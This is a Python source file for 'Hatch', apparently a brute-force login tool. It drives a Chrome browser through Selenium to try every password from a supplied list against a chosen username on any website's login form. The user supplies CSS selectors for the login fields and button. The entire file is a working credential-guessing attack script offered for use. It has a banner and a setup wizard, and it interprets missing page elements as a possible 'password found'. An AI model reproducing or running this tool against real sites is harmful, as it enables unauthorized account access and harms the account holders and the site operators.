import sys
import datetime
import requests
import time as t
from sys import stdout
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from webdriver_manager.chrome import ChromeDriverManager
from optparse import OptionParser

# Graphics
class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    CWHITE  = '\33[37m'

# Config
parser = OptionParser()
now = datetime.datetime.now()

# Args
parser.add_option("-u", "--username", dest="username", help="Choose the username")
parser.add_option("--usernamesel", dest="usernamesel", help="Choose the username selector")
parser.add_option("--passsel", dest="passsel", help="Choose the password selector")
parser.add_option("--loginsel", dest="loginsel", help="Choose the login button selector")
parser.add_option("--passlist", dest="passlist", help="Enter the password list directory")
parser.add_option("--website", dest="website", help="Choose a website")
(options, args) = parser.parse_args()

CHROME_DVR_DIR = CHROME_DVR_DIR = r'C:\Users\DELL\Downloads\Hatch\chrome-win32\chromedriver.exe'
service = Service(executable_path=CHROME_DVR_DIR)
# Set up the ChromeDriver service
service = Service(ChromeDriverManager().install())

# Initialize WebDriver
try:
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service)
except WebDriverException as e:
    print(f"{color.RED}[!] WebDriver initialization failed: {e}{color.END}")
    sys.exit(1)

def wizard():
    print(banner)
    website = input(f"{color.GREEN}[~] {color.CWHITE}Enter a website: ")
    sys.stdout.write(f"{color.GREEN}[!] {color.CWHITE}Checking if site exists ")
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print(f"{color.GREEN}[OK]{color.CWHITE}")
            sys.stdout.flush()
    except requests.RequestException:
        t.sleep(1)
        print(f"{color.RED}[X]{color.CWHITE}")
        t.sleep(1)
        print(f"{color.RED}[!] {color.CWHITE}Website could not be located. Make sure to use http:// or https://")
        exit()

    username_selector = input(f"{color.GREEN}[~] {color.CWHITE}Enter the username selector: ")
    password_selector = input(f"{color.GREEN}[~] {color.CWHITE}Enter the password selector: ")
    login_btn_selector = input(f"{color.GREEN}[~] {color.CWHITE}Enter the Login button selector: ")
    username = input(f"{color.GREEN}[~] {color.CWHITE}Enter the username to brute-force: ")
    pass_list = input(f"{color.GREEN}[~] {color.CWHITE}Enter the path to a password list: ")
    brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website)

def brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website):
    try:
        with open(pass_list, 'r') as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print(f"{color.RED}[!] Password list file not found: {pass_list}{color.END}")
        driver.quit()
        sys.exit(1)

    options = webdriver.ChromeOptions()
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-extensions")

    for password in passwords:
        password = password.strip()
        try:
            driver.get(website)
            t.sleep(2)
            sel_user = driver.find_element(By.CSS_SELECTOR, username_selector)
            sel_pass = driver.find_element(By.CSS_SELECTOR, password_selector)
            enter = driver.find_element(By.CSS_SELECTOR, login_btn_selector)
            sel_user.clear()
            sel_pass.clear()
            sel_user.send_keys(username)
            sel_pass.send_keys(password)
            enter.click()
            t.sleep(5)
            print(f"{color.GREEN}Tried password: {color.RED}{password}{color.GREEN} for user: {color.RED}{username}{color.END}")
        except NoSuchElementException:
            print(f"{color.RED}[!] An element was not found on the page. Possible reasons: incorrect selectors, password found, or account locked.{color.END}")
            print(f"{color.GREEN}Last attempted password: {color.RED}{password}{color.END}")
            driver.quit()
            exit()
        except WebDriverException as e:
            print(f"{color.RED}[!] WebDriver exception occurred: {e}{color.END}")
            driver.quit()
            exit()
        except KeyboardInterrupt:
            print(f"{color.RED}[!] User interrupted the process.{color.END}")
            driver.quit()
            exit()

banner = f"""{color.BOLD}{color.RED}
  _    _       _       _
 | |  | |     | |     | |
 | |__| | __ _| |_ ___| |__
 |  __  |/ _` | __/ __| '_ \\
 | |  | | (_| | || (__| | | |
 |_|  |_|\__,_|\__\___|_| |_|{color.END}
  {color.RED}[{color.CWHITE}-{color.RED}]{color.END}--> {color.GREEN}V.1.0{color.END}
  {color.RED}[{color.CWHITE}-{color.RED}]{color.END}--> {color.GREEN}coded by Metachar{color.END}
  {color.RED}[{color.CWHITE}-{color.RED}]{color.END}--> {color.GREEN}brute-force tool{color.END}
"""

if not all([options.username, options.usernamesel, options.passsel, options.loginsel, options.passlist, options.website]):
    wizard()
else:
    username = options.username
    username_selector = options.usernamesel
    password_selector = options.passsel
    login_btn_selector = options.loginsel
    website = options.website
    pass_list = options.passlist
    print(banner)
    brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website)
